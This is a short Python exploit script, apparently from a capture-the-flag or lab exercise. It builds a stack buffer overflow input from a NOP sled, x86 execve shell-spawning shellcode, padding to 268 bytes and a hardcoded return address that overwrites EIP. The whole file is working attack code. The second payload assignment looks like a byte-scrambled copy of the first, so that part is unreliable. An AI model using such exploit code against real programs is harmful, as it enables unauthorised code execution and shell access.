#!/usr/bin/env python

from struct import *

NOP = '\x90'
nopsled = NOP * 100

padding = 'A' * (268 - 100 - 24)

eip = pack('I', 0xffffce50)

payload = "\x31\xc0\x50\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload = "\x68\x50\xc0\x31\x68\x73\x71\x2f\x69\x62\x2f\x68\x50\xe3\x89\x63\xb0\xe1\x89\x53\x80\xcd\x0b\xb0"

print nopsled + payload + padding + eip
